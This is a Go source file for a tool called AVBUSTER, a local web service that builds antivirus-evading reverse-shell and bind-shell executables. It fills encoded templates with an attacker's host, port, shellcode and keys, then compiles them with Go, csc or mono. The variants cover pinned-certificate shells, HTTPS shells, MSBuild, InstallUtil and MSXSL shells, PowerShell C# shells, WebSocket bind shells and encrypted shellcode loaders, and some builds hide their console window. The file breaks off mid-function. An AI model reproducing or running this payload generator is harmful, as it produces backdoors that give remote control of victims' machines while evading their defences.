package main

import (
	"bufio"
	"bytes"
	"compress/flate"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"./binarytemplates"
	"github.com/gorilla/mux"
)

type baseframe struct {
	Serverip string `json:"serverip"`
}

type DownloadLink struct {
	Link string
}
type UserValues struct {
	userchoice            string
	rport                 string
	lport                 string
	lhost                 string
	rhost                 string
	shellcode             string
	shellcodedeckey       string
	saveas                string
	privatekey            string
	publickey             string
	fingerprint           string
	targetos              string
	targetarchitecture    string
	controlleros          string
	controllerachitecture string
	binarytemplate        string
	ismanager             bool
	apptype               string
}

type UserSelectedOsDetails struct {
	apptype               string
	targetos              string
	targetarchitecture    string
	controlleros          string
	controllerachitecture string
}

var appconfig baseframe
var dwnloadlink DownloadLink
var avbustertemplate *template.Template

var basepath, outpath, exepath, exeoutpath, downloadlink, manageroutpath string

func init() {
	appconfig = baseframe{}
	dwnloadlink = DownloadLink{}
	avbustertemplate = template.Must(template.ParseFiles("templates/avbuster.html"))

}
func main() {
	fmt.Println("[AVBUSTER Service Status : Running]")
	fmt.Println("http://0.0.0.0:8085")
	go startindefaultbrowser("http://127.0.0.1:8085")
	startserver()
}
func startindefaultbrowser(urlval string) {

	if runtime.GOOS == "linux" {
		err := exec.Command("xdg-open", urlval).Start()
		checkerror(err)
	} else if runtime.GOOS == "windows" {
		err := exec.Command("rundll32", "url.dll,FileProtocolHandler", urlval).Start()
		checkerror(err)
	}
}
func checkerror(err error) {
	if err != nil {
		fmt.Println(err)
		//return
	}
}

func (currentuservals *UserValues) prepareEncryptedShellCode(ismanager bool) {
	var setpath string
	fmt.Println(currentuservals.saveas)
	if ismanager {
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
		setpath = manageroutpath
	} else {
		setpath = outpath
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"

	}
	newFile, err := os.Create(setpath)
	checkerror(err)
	scanner := bufio.NewScanner(strings.NewReader(currentuservals.binarytemplate))
	for scanner.Scan() {
		strline := scanner.Text()
		if strings.Contains(strline, "@SHELL@") {
			strline = strings.Replace(strline, "@SHELL@", currentuservals.shellcode, -1)
			//fmt.Println(portreplaced)
		}
		if strings.Contains(strline, ":KEY") {
			strline = strings.Replace(strline, ":KEY", currentuservals.shellcodedeckey, 1)
		}
		newFile.WriteString(strline + "\n")
	}

	newFile.Close()
	finflag := make(chan string)
	osandappdetails := UserSelectedOsDetails{}
	osandappdetails.apptype = currentuservals.apptype
	osandappdetails.controlleros = currentuservals.controlleros
	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
	osandappdetails.targetos = currentuservals.targetos
	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, ismanager)
	<-finflag
}
func (currentuservals *UserValues) createavbusterpayload(ismanager bool, isCs bool) {
	var setpath, valuetowrite string
	fmt.Println(currentuservals.saveas)
	if ismanager {
		if runtime.GOOS == "windows" {
			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
			setpath = manageroutpath
		} else {
			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager"
			setpath = manageroutpath
		}
	} else {
		if currentuservals.targetos == "windows" {
			setpath = outpath
			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
		} else {
			setpath = outpath
			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas
		}
	}
	ipandport := currentuservals.lhost + ":" + currentuservals.lport
	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
	//fmt.Println(managerfinalval)
	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
	if strings.Contains(portreplaced, "@SHELL@") {
		valuetowrite = strings.Replace(portreplaced, "@SHELL@", currentuservals.shellcode, -1)
		fmt.Println(portreplaced)
	}
	valuetowrite = strings.Replace(portreplaced, ":KEY", currentuservals.shellcodedeckey, 1)

	if strings.TrimSpace(currentuservals.privatekey) != "" &&
		strings.TrimSpace(currentuservals.publickey) != "" {
		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
	}
	newFile, err := os.Create(setpath)
	checkerror(err)
	newFile.WriteString(valuetowrite)
	newFile.Close()
	finflag := make(chan string)
	if isCs {
		//fmt.Println(dwnloadlink.Link)
		//fmt.Println(setpath)
		go avbusterbuildcsexe(finflag, dwnloadlink.Link, setpath)
		<-finflag
	} else {
		osandappdetails := UserSelectedOsDetails{}
		osandappdetails.apptype = currentuservals.apptype
		osandappdetails.controlleros = currentuservals.controlleros
		osandappdetails.controllerachitecture = currentuservals.controllerachitecture
		osandappdetails.targetos = currentuservals.targetos
		osandappdetails.targetarchitecture = currentuservals.targetarchitecture
		go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, ismanager)
		<-finflag

	}
}

func (currentuservals *UserValues) createavbusterGUIpayload(ismanager bool) {
	var setpath, valuetowrite string
	fmt.Println(currentuservals.saveas)
	if ismanager {
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
		setpath = manageroutpath
	} else {
		setpath = outpath
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"

	}
	//if ismanager {
	//fmt.Println(setpath)
	//}
	//fmt.Println(userselectedval.binarytemplate)
	ipandport := currentuservals.lhost + ":" + currentuservals.lport
	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
	//fmt.Println(managerfinalval)
	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", currentuservals.shellcode, 1)

	if strings.TrimSpace(currentuservals.privatekey) != "" &&
		strings.TrimSpace(currentuservals.publickey) != "" {
		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
	}

	//fmt.Println(valuetowrite)

	//fmt.Println(setpath)
	newFile, err := os.Create(setpath)
	if err != nil {
		log.Fatal(err)
	}
	newFile.WriteString(valuetowrite)
	newFile.Close()
	finflag := make(chan string)
	go avbusterGUIbuilder(finflag, dwnloadlink.Link, setpath)
	<-finflag
}
func (currentuservals *UserValues) createavbusterCSConsolePayload(ismanager bool) {
	var setpath, valuetowrite string
	fmt.Println(currentuservals.saveas)
	if ismanager {
		dwnloadlink.Link = "download" + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
		setpath = manageroutpath
	} else {
		setpath = outpath
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"

	}
	//if ismanager {
	//fmt.Println(setpath)
	//}
	//fmt.Println(userselectedval.binarytemplate)
	ipandport := currentuservals.lhost + ":" + currentuservals.lport
	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
	//fmt.Println(managerfinalval)
	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", currentuservals.shellcode, 1)

	if strings.TrimSpace(currentuservals.privatekey) != "" &&
		strings.TrimSpace(currentuservals.publickey) != "" {
		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
	}

	//fmt.Println(valuetowrite)

	//fmt.Println(setpath)
	newFile, err := os.Create(setpath)
	if err != nil {
		log.Fatal(err)
	}
	newFile.WriteString(valuetowrite)
	newFile.Close()
	finflag := make(chan string)

	go avBusterConsoleBuilder(finflag, dwnloadlink.Link, setpath)
	<-finflag
}
func readfilecontent(fpath string) string {
	contents, err := ioutil.ReadFile(fpath)
	if err != nil {
		fmt.Println(err)
	}
	return (string(contents))
}

func avBusterConsoleBuilder(finflag chan string, exepath, csfilepath string) {
	fmt.Println("building exe.....")

	cscpath := `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
	//cscpath := `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
	exepath, _ = filepath.Abs(exepath)
	csfilepath, _ = filepath.Abs(csfilepath)
	cscargs := []string{`-out:` + exepath, csfilepath}
	cmd := exec.Command(cscpath, cscargs...)
	res, err := cmd.CombinedOutput()
	fmt.Println(string(res))

	fmt.Println(cscargs)
	fmt.Println(exepath)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Build Success !")
	}
	finflag <- "build succeed"
}
func avbusterbuildcsexe(finflag chan string, exepath, csfilepath string) {
	if runtime.GOOS == "linux" {
		cscpath, _ := exec.LookPath("mono-csc")
		fmt.Println(cscpath)
		cscargs := []string{`/target:exe`, `-out:` + exepath, csfilepath, `-r:System.Windows.Forms.dll,System.Data,System.Drawing.dll`}
		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))
		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}

	} else {
		fmt.Println("building exe.....")

		cscpath := `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
		//cscpath := `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
		exepath, _ = filepath.Abs(exepath)
		csfilepath, _ = filepath.Abs(csfilepath)
		cscargs := []string{`/target:exe`, `-out:` + exepath, csfilepath}
		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))

		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}
	}
	finflag <- "Build Success"

}
func avbusterGUIbuilder(finflag chan string, exepath, csfilepath string) {
	if runtime.GOOS == "linux" {
		cscpath, _ := exec.LookPath("mono-csc")
		fmt.Println(cscpath)
		cscargs := []string{`/target:winexe`, `-out:` + exepath, csfilepath, `-r:System.Windows.Forms.dll,System.Data,System.Drawing.dll`}
		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))
		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}

	} else {
		fmt.Println("building exe.....")

		cscpath := `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
		//cscpath := `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
		exepath, _ = filepath.Abs(exepath)
		csfilepath, _ = filepath.Abs(csfilepath)
		cscargs := []string{`/target:winexe`, `-out:` + exepath, csfilepath}
		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))

		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}
	}
	finflag <- "build succeed"

}

func (userslectedOsandapptype *UserSelectedOsDetails) avbusterbuildgoexe(finflag chan string, exepath, gofilepath string, isManager bool) {
	var arch, ostype string
	arch = userslectedOsandapptype.targetarchitecture
	ostype = userslectedOsandapptype.targetos
	if isManager {
		arch = userslectedOsandapptype.controllerachitecture
		ostype = userslectedOsandapptype.controlleros
	}
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		if isManager {
			execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath
		} else {
			if userslectedOsandapptype.apptype == "Console" {
				execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath
			} else {
				execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -ldflags -H=windowsgui -o " + exepath + " " + gofilepath
			}
		}

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		//err := cmd.Start()
		//cmd.Wait()
		res, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
		fmt.Println(string(res))
	} else {
		fmt.Println("building exe.....")
		//fmt.Println(gofilepath)
		fmt.Println(exepath)
		buildpath := filepath.FromSlash(`build.bat`)
		buildbat, err := os.Create(buildpath)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(buildpath)
		buildbat.WriteString("SET GOOS=" + ostype + "\n")
		buildbat.WriteString("SET GOARCH=" + arch + "\n")
		if isManager {
			buildbat.WriteString("go build -o " + exepath + " " + gofilepath)
		} else {
			if userslectedOsandapptype.apptype == "Console" {
				buildbat.WriteString("go build -o " + exepath + " " + gofilepath)
			} else {
				buildbat.WriteString("go build -ldflags -H=windowsgui -o " + exepath + " " + gofilepath)
			}
		}
		buildbat.Close()

		err = exec.Command(buildpath).Run()
		if err != nil {
			fmt.Println(err)
		} else {
			//fmt.Println("Binary is ready to use on " + exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
	}
	finflag <- "Build Success"
}

func clearoutfilefolder() {
	gofiles, err := filepath.Glob("outfiles/*.go")
	if err != nil {
		fmt.Println(err)
	}
	for _, f := range gofiles {
		if err := os.Remove(f); err != nil {
			fmt.Println(err)
		}
	}
	csfiles, err := filepath.Glob("outfiles/*.cs")
	if err != nil {
		fmt.Println(err)
	}
	for _, f := range csfiles {
		if err := os.Remove(f); err != nil {
			fmt.Println(err)
		}
	}
}

func processpscustomshellcode(req *http.Request) {
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	rhost := req.Form.Get("lhost")
	rport := req.Form.Get("lport")
	shellcode := req.Form.Get("shellcode")
	createpsvirtualallocpayload(rhost, rport, shellcode, saveas)
	time.Sleep(5000 * time.Millisecond)
	os.Remove("outfiles/psvalloc.go")

}

func processhttpmeterpretershell(req *http.Request) {
	err := req.ParseForm()
	checkerror(err)
}

func processhttpsmeterpretershell(req *http.Request) {
	err := req.ParseForm()
	checkerror(err)
}

func (currentuservals *UserValues) processpinnedcertrevshell(req *http.Request) {
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetos := req.Form.Get("ostype")
	architecture := req.Form.Get("archtype")
	fingerprint := req.Form.Get("fprint")
	shelltype := req.Form.Get("shelltype")
	controllerachitecture := req.Form.Get("cntarchtype")
	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = strings.ToLower(targetos)
	currentuservals.fingerprint = fingerprint
	currentuservals.apptype = shelltype
	if architecture == "32" {
		currentuservals.targetarchitecture = "386"
	} else {
		currentuservals.targetarchitecture = "amd64"

	}

	currentuservals.controlleros = strings.ToLower(req.Form.Get("cntostype"))
	if controllerachitecture == "32" {
		currentuservals.controllerachitecture = "386"
	} else {
		currentuservals.controllerachitecture = "amd64"

	}
	currentuservals.saveas = saveas
	//fmt.Println(apptype)

	outpath = `outfiles` + string(os.PathSeparator) + `pinnedcert.go`
	manageroutpath = `outfiles` + string(os.PathSeparator) + `pinnedcertmanager.go`
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPinnedCertReverseShell)
	fmt.Println("building pinned cert revshell")
	currentuservals.createavbusterpayload(false, false)

	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPinnedCertReverseShellManager)
	currentuservals.createavbusterpayload(true, false)
	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processselfsignedrevshell(req *http.Request) {
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetos := req.Form.Get("ostype")
	architecture := req.Form.Get("archtype")
	controlleros := req.Form.Get("cntostype")
	controllerarchtype := req.Form.Get("cntarchtype")

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = strings.ToLower(targetos)
	currentuservals.controlleros = strings.ToLower(controlleros)
	if controllerarchtype == "32" {
		currentuservals.controllerachitecture = "386"
	} else {
		currentuservals.controllerachitecture = "amd64"

	}
	if architecture == "32" {
		currentuservals.targetarchitecture = "386"
	} else {
		currentuservals.targetarchitecture = "amd64"

	}
	currentuservals.saveas = saveas
	//fmt.Println(apptype)

	outpath = `outfiles` + string(os.PathSeparator) + `httpsrevshell.go`
	manageroutpath = `outfiles` + string(os.PathSeparator) + `httpsrevshellmanager.go`
	currentuservals.binarytemplate = binarytemplates.AvBusterSelfSignedHttps
	fmt.Println("building http revshell")
	currentuservals.createavbusterpayload(false, false)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterSelfSignedHttpsManager)
	currentuservals.createavbusterpayload(true, false)
	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processmsbuildrevshell(req *http.Request) {
	var archtype string
	err := req.ParseForm()
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}
	if err != nil {
		fmt.Println(err)
	}
	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	apptype := req.Form.Get("shelltype")
	ostype := "windows"
	archtype = "386"

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = ostype
	currentuservals.targetarchitecture = archtype
	currentuservals.saveas = saveas

	//fmt.Println(apptype)
	if apptype == "Console" {
		outpath = `outfiles` + string(os.PathSeparator) + `msbuild.cs`
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterMSBuildTCPReverseShellCS)
		fmt.Println("building msbuild console")
		currentuservals.createavbusterpayload(false, true)

	} else {
		outpath = `outfiles` + string(os.PathSeparator) + `msbuildgui.cs`
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterMsBuildTCPReverseShellGUI)
		fmt.Println("building GUI msbuild gui revshell")
		currentuservals.createavbusterGUIpayload(false)

	}

	//createpsrevshellpayload(rhost, rport, saveas)
	//time.Sleep(5000 * time.Millisecond)
	//dwnloadlink.Link = "download/" + saveas + ".exe"
	//os.Remove("outfiles/rev.go")

	os.Remove(outpath)
}

func (currentuservals *UserValues) processinstallutilrevshell(req *http.Request) {
	var archtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	ostype := "windows"
	archtype = "386"

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = ostype
	currentuservals.targetarchitecture = archtype
	currentuservals.saveas = saveas

	//fmt.Println(apptype)
	outpath = `outfiles` + string(os.PathSeparator) + `installutil.go`
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInstallShieldTCPReverseShell)
	fmt.Println("building installutil revshell")
	currentuservals.createavbusterpayload(false, false)

	os.Remove(outpath)
}

func (currentuservals *UserValues) processmsxsltrevshell(req *http.Request) {
	var archtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}
	checkerror(err)
	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	apptype := req.Form.Get("shelltype")
	ostype := "windows"
	archtype = "386"

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = ostype
	currentuservals.targetarchitecture = archtype
	currentuservals.saveas = saveas

	//fmt.Println(apptype)
	if apptype == "Console" {
		outpath = `outfiles` + string(os.PathSeparator) + `msxslt.cs`
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInlinerConsoleRevShell)
		fmt.Println("building msxslt")
		currentuservals.createavbusterpayload(false, true)
	} else {
		outpath = `outfiles` + string(os.PathSeparator) + `msxsltgui.cs`
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterInlinerGUIRevShell)
		fmt.Println("building GUI msxslt")
		currentuservals.createavbusterGUIpayload(false)

	}
	//clearoutfilefolder()
	os.Remove(outpath)
}

func (currentuservals *UserValues) processencryptedcustomshellcode(req *http.Request) {
	var archtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}
	ostype := "windows"
	archtype = "386"
	key := req.Form.Get("key")
	shellcode := req.Form.Get("shellcode")

	//currentuservals := UserValues{}

	currentuservals.targetos = ostype
	currentuservals.shellcodedeckey = key
	currentuservals.shellcode = shellcode
	currentuservals.targetarchitecture = archtype
	currentuservals.saveas = saveas

	//fmt.Println(apptype)
	outpath = `outfiles` + string(os.PathSeparator) + `encshell.go`
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterEncryptedShellCode)
	fmt.Println("building encshellcode revshell")
	currentuservals.prepareEncryptedShellCode(false)

	os.Remove(outpath)
}

func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := avbustertemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		checkerror(err)
		choice := req.Form.Get("selectedshelltype")
		currentuservals := UserValues{}
		if choice == "psrevshell" {
			currentuservals.processpsrevshellbuild(req)
		} else if choice == "msbuildrevshell" {
			currentuservals.processmsbuildrevshell(req)
		} else if choice == "hybridencrypted" {
			currentuservals.processhybridencrypt(req)
		} else if choice == "selfsigned" {
			currentuservals.processselfsignedrevshell(req)
		} else if choice == "customgo" {
			currentuservals.processcustomgo(req)
		} else if choice == "httprevshell" {
			currentuservals.processhttprevshell(req)
		} else if choice == "pscsharprevshell" {
			currentuservals.processpscsharp(req)
		} else if choice == "installutilrevshell" {
			currentuservals.processinstallutilrevshell(req)
		} else if choice == "msxmlxslttcprevshell" {
			currentuservals.processmsxsltrevshell(req)
		} else if choice == "customdotnetrev" {
			currentuservals.processcustomdotnet(req)
		} else if choice == "encshellcode" {
			currentuservals.processencryptedcustomshellcode(req)
		} else if choice == "pinnedcert" {
			currentuservals.processpinnedcertrevshell(req)
		} else if choice == "normaltcprev" {
			currentuservals.processnormalrevtcp(req)
		} else if choice == "websocketbindshell" {
			currentuservals.processwebsocketbindshell(req)
		}
		err = avbustertemplate.Execute(httpw, nil)
		checkerror(err)
	}
}
func (currentuservals *UserValues) processwebsocketbindshell(req *http.Request) {
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lport := req.Form.Get("lport")
	rport := req.Form.Get("rport")
	rhost := req.Form.Get("rhost")
	//currentuservals := UserValues{}
	currentuservals.lport = lport
	currentuservals.rport = rport
	currentuservals.rhost = rhost
	currentuservals.targetos = "windows"
	currentuservals.targetarchitecture = "386"
	currentuservals.saveas = saveas

	outpath = "outfiles" + string(os.PathSeparator) + "websocketbinshell.go"
	outpath2 := "outfiles" + string(os.PathSeparator) + "websocketbinshellagent.go"

	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterWebSocketGetIPandUpdateHTML)
	currentuservals.createwebsocketbinshell(outpath)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterWebSocketBindShellAgent)
	currentuservals.createwebsocketbinshellagent(outpath2)
	os.Remove(outpath)
	os.Remove(outpath2)
}

func (currentuservals *UserValues) processpscsharp(req *http.Request) {
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	apptype := req.Form.Get("shelltype")
	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.apptype = apptype
	currentuservals.targetos = "windows"
	currentuservals.targetarchitecture = "386"
	currentuservals.saveas = saveas

	if apptype == "Console" {
		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevtcp.cs"
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPSCsharpRevShellConsole)
		fmt.Println("building psrevshell")
		currentuservals.createavbusterpayloadforpscsharp(false)

	} else {
		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevgui.cs"
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPSCsharpRevShellGUI)
		fmt.Println("building GUI psrevshell")
		currentuservals.createavbusterpayloadforpscsharp(true)
	}

	os.Remove(outpath)
}

func (currentuservals *UserValues) createwebsocketbinshell(outpath string) {
	var setpath string

	fmt.Println(currentuservals.saveas)

	dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"

	correctedquotes := strings.Replace(currentuservals.binarytemplate, "RPL", "`", -1)
	rportreplaced := strings.Replace(correctedquotes, "RPORT", currentuservals.rport, 1)
	lportreplaced := strings.Replace(rportreplaced, "LPORT", currentuservals.lport, 1)
	setpath = outpath
	newFile, err := os.Create(setpath)
	checkerror(err)
	newFile.WriteString(lportreplaced)
	newFile.Close()
	finflag := make(chan string)

	osandappdetails := UserSelectedOsDetails{}
	//osandappdetails.apptype = currentuservals.apptype
	osandappdetails.controlleros = currentuservals.controlleros
	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
	osandappdetails.targetos = currentuservals.targetos
	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
	osandappdetails.apptype = "Console"
	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, false)
	<-finflag

}

func (currentuservals *UserValues) createwebsocketbinshellagent(outpath string) {
	var setpath string

	fmt.Println(currentuservals.saveas)

	dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "agent" + ".exe"

	correctedquotes := strings.Replace(currentuservals.binarytemplate, "RPL", "`", -1)
	rhostreplaced := strings.Replace(correctedquotes, "RHOST", currentuservals.rhost, 1)
	rportreplaced := strings.Replace(rhostreplaced, "RPORT", currentuservals.rport, 1)
	lportreplaced := strings.Replace(rportreplaced, "LPORT", currentuservals.lport, 1)

	setpath = outpath
	newFile, err := os.Create(setpath)
	checkerror(err)
	newFile.WriteString(lportreplaced)
	newFile.Close()
	finflag := make(chan string)

	osandappdetails := UserSelectedOsDetails{}
	//osandappdetails.apptype = currentuservals.apptype
	osandappdetails.controlleros = currentuservals.controlleros
	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
	osandappdetails.targetos = currentuservals.targetos
	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
	osandappdetails.apptype = "Console"
	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, false)
	<-finflag

}

func (currentuservals *UserValues) createavbusterpayloadforpscsharp(isGui bool) {
	var setpath string

	fmt.Println(currentuservals.saveas)
	if currentuservals.targetos == "windows" {
		setpath = outpath
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
	} else {
		setpath = outpath
		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas
	}

	ipreplaced := strings.Replace(currentuservals.binarytemplate, "RHOST", currentuservals.lhost, 1)
	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)

	newFile, err := os.Create(setpath)
	checkerror(err)
	newFile.WriteString(portreplaced)
	newFile.Close()
	finflag := make(chan string)

	//fmt.Println(dwnloadlink.Link)
	//fmt.Println(setpath)
	go avbusterbuildpscsharpconsole(finflag, dwnloadlink.Link, setpath, isGui)
	<-finflag

}

func decodeanddecompress(userval string) string {
	dcodedval, _ := base64.StdEncoding.DecodeString(userval)
	zipbuffer := bytes.NewReader(dcodedval)
	decompressedbytes, _ := gzip.NewReader(zipbuffer)
	originalval, _ := ioutil.ReadAll(decompressedbytes)
	return string(originalval)
}

func compressandcode(userval string) string {
	var zipbuffer bytes.Buffer
	gzwriter := gzip.NewWriter(&zipbuffer)
	if _, err := gzwriter.Write([]byte(userval)); err != nil {
		log.Fatal(err)
	}
	if err := gzwriter.Flush(); err != nil {
		log.Fatal(err)
	}
	if err := gzwriter.Close(); err != nil {
		log.Fatal(err)
	}
